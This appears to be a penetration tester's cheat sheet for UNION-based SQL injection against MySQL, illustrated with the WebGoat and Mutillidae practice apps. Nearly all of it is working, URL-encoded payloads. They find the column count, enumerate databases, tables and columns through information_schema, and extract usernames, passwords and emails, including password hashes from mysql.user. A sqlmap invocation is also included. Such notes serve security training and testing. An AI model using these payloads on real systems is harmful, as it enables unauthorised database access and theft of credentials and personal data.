SQL Injection UNION Based
=========================

Notes
-----
```
-- requires a space at the end (--+) !!!!!!!!!!!!!!!!!!!!
Depending on identified injection technique use "#" or "--+" for comment.
Should use "--+" when atttack in the URL

Nice cheat sheets
https://www.perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

It is possible to use ASCII HEX encoding for some of the variable names. (Use Burp decoder/encoder)
Must be prefixed with "0x"
When using ASCII HEX, quotes are not required. Do not use them...
"databasename" when encoded would become "0x64617461626173656e616d65"
"tablename" when encoded would become "0x7461626c656e616d65"

Use sqlmap -v 7 to gather more details
sqlmap -r ./xxxxx.txt --batch -v 7 > ./yyyyyyyyyy.txt
-t TRAFFICFILE ?????????
Review results............

Add comments at end of parameter to help identify SQLInjection
Valid request returns no error
theUserName=fzappa
Returns Error
theUserName=fzappa'
Returns No Error (potentially vulnerable)
fzappa--+ORDER+BY+1
```




Get Number of Columns First (Required for further attacks)
----------------------------------------------------------
```sql
--  Method 1
-- Increment "number" by 1 and monitor response for different responses or errors.
-- If the error is returned on "'+ORDER+BY+4#" then the table has 3 columns. 
'+ORDER+BY+1#
'+ORDER+BY+2#
'+ORDER+BY+3#
'+ORDER+BY+4#
'+ORDER+BY+5#
'+ORDER+BY+?............#


-- Method 2
-- Increment ",NULL" by adding additional ",NULL" and monitor response for different responses or errors.
-- If the error is returned on "'+UNION SELECT NULL,NULL,NULL,NULL#" then the table has 3 columns. 
'+UNION+SELECT+NULL#
'+UNION+SELECT+NULL,NULL#
'+UNION+SELECT+NULL,NULL,NULL#
'+UNION+SELECT+NULL,NULL,NULL,NULL#
'+UNION+SELECT+NULL,NULL,NULL,NULL........#
```



Retrieve All Database Names
---------------------------
```sql
'UNION+ALL+SELECT+NULL,NULL,concat(schema_name)+FROM+information_schema.schemata#
'+UNION+ALL+SELECT+NULL,NULL,CONCAT('~',schema_name,'~'),NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.SCHEMATA--+
```



Get Current Database Name and Additional Information
----------------------------------------------------
```sql
'+UNION+ALL+SELECT+database(),NULL,NULL#
'+UNION+ALL+SELECT+NULL,NULL,CONCAT('~',DATABASE(),'~'),NULL,NULL,NULL,NULL--+
@@datadir
@@hostname
@@version
current_role()
database()
found_rows
row_count()
schema()
session_user()
system_user()
user()
version()
```



Get Tables in Database
----------------------
```sql
-- Table has 3 columns as identified above for this reason there are two "NULL" required. 
'+UNION+ALL+SELECT+NULL,NULL,concat(TABLE_NAME)+FROM+information_schema.TABLES+WHERE+table_schema='webgoat_coins'#
'UNION+ALL+SELECT+NULL,NULL,CONCAT('~',table_name,'~'),NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema+IN+('mutillidae')--+
'UNION+ALL+SELECT+NULL,NULL,CONCAT(table_name),NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema+IN+('mutillidae')--+
```


Get Columns When Table Name is Known
------------------------------------
```sql
# Table has 3 columns as identified above for this reason there are two "NULL" required. 
'+UNION+ALL+SELECT+NULL,NULL,CONCAT(column_name,'+',column_type)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='products'+AND+table_schema='webgoat_coins'#

# Table has 7 columns
'UNION+ALL+SELECT+NULL,NULL,CONCAT('qpjpq',column_name,'ubndwt',column_type,'qvpkq'),NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='accounts'+AND+table_schema='mutillidae'--+
'UNION+ALL+SELECT+NULL,NULL,CONCAT(column_name,'~',column_type),NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='accounts'+AND+table_schema='mutillidae'--+
```


Get Data from Columns MORE NOTES NEEDED 
---------------------
```sql

INJECTION MUST RESPECT THE NUMBER OF COLUMNS. USE NULL IF REQUIRED.
'+UNION+SELECT+<columnname>,<columnname>+FROM+<tablename>--%20
'+UNION+SELECT+user,password+FROM+users--%20
# 7 columns
'+UNION+ALL+SELECT+NULL,NULL,CONCAT(username,'+',password),NULL,NULL,NULL,NULL+FROM+mutillidae.accounts--+

'+UNION+SELECT+NULL,email,+password+FROM+customerlogin#
'+UNION+SELECT+answer,email,+password+FROM+customerlogin#


#############TESTING NOTES########################
Get data from other tables
'+UNION+SELECT+username,+password+FROM+users+

Retrieving multiple values within a single column - useful if the application only returns a single column in the response.
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```




Get Data From Other Databases
-----------------------------
```
# Need to know the dbname, tablename, and column names.
'UNION+ALL+SELECT+NULL,NULL,concat(0x28,column1,0x3a,column2,0x29)+FROM+dbname.tablename#
'UNION+ALL+SELECT+NULL,NULL,concat(0x28,user,0x3a,password,0x29)+FROM+mysql.user#

```
